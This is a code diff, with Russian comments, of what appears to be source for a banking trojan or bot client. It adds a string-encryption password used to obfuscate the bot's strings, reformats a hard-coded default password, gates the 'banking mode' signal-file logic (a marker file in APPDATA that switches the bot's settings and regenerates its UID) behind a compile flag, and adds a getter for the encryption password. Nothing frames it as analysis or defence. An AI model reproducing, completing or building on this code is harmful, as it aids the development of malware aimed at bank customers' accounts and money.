@@ -109,13 +109,17 @@ namespace CONFIGDEBUGSTRINGS
 #endif
 
 
+//--------------------------------------------
+//  Пароль шифрования строк
+//--------------------------------------------
+char ENCRYPT_STRINGS_PASSWORD[MAX_STRINGS_PASSW_SIZE + 1] = BOTPARAM_STRINGS_PASSW;
 
 
 //----------------------------------------------------------------------------
 // Стандартный пароль, будет использоваться только в случаях
 // когда требуется основной пароль, но он не указан
 //----------------------------------------------------------------------------
-const char DefaultPassword[] = {'K', '8', 'D', 'F', 'a', 'G', 'Y', 'U', 's', '8', '3', 'K', 'F', '0', '5', 'T',  0};;
+const char DefaultPassword[] = "K8DFaGYUs83KF05T";
 
 
 
@@ -165,34 +169,19 @@ PCHAR GetBotHosts()
 //----------------------------------------------------------------------------
 
 
-string GetBankingModeFileName()
-{
-	// Функция возвращает имя сигнального файла
-	// для банковского префикса
-
-	string Path(MAX_PATH);
-	if (!SHGetSpecialFolderPathA(NULL, Path.t_str(), CSIDL_APPDATA, TRUE))
-		return NULLSTR;
-    Path.CalcLength();
-
-    Path += "\\";
-	Path += BANKING_SIGNAL_FILE;
-
-	return Path;
-}
-//-----------------------------------------------------------------------------
-
 void SetBankingMode(bool IsBanking)
 {
-	string FileName = GetBankingModeFileName();
-	if (!FileName.IsEmpty())
-	{
-		if (IsBanking)
-			File::WriteBufferA(FileName.t_str(), FileName.t_str(), 3);
-		else
-			pDeleteFileA(FileName.t_str());
-		GenerateUid(BOT_UID);
-	}
+	#ifdef USE_BANKING_PREFIX
+		string FileName = GetBankingModeFileName();
+		if (!FileName.IsEmpty())
+		{
+			if (IsBanking)
+				File::WriteBufferA(FileName.t_str(), FileName.t_str(), 3);
+			else
+				pDeleteFileA(FileName.t_str());
+			GenerateUid(BOT_UID);
+		}
+	#endif
 }
 //-----------------------------------------------------------------------------
 
@@ -200,13 +189,34 @@ bool IsBankingMode()
 {
 	// Функция возвращает истину если включен режим "Банк"
 	// В этом режиме настройки бота могут отличаться от обычных
-
-	string FileName = GetBankingModeFileName();
-	return FileExistsA(FileName.t_str());
+    #ifdef USE_BANKING_PREFIX
+		string FileName = GetBankingModeFileName();
+		return FileExistsA(FileName.t_str());
+	#else
+		return false;
+	#endif
 }
-
 //-----------------------------------------------------------------------------
 
+#ifdef USE_BANKING_PREFIX
+	string GetBankingModeFileName()
+	{
+		// Функция возвращает имя сигнального файла
+		// для банковского префикса
+
+		string Path(MAX_PATH);
+		if (!SHGetSpecialFolderPathA(NULL, Path.t_str(), CSIDL_APPDATA, TRUE))
+			return NULLSTR;
+		Path.CalcLength();
+
+		Path += "\\";
+		Path += BANKING_SIGNAL_FILE;
+
+		return Path;
+	}
+	//-----------------------------------------------------------------------------
+
+#endif
 
 string GetPrefix(bool CheckBankingMode)
 {
@@ -710,6 +720,13 @@ string GetMainPassword2(bool NotNULL)
 		Pass = DefaultPassword;
 
 	return Pass;
+}
+//----------------------------------------------------------------------------
+
+// Функция возвращает указатель на пароль для шифрования строк
+PCHAR GetStringsPassword()
+{
+	return ENCRYPT_STRINGS_PASSWORD;
 }
 //----------------------------------------------------------------------------
 
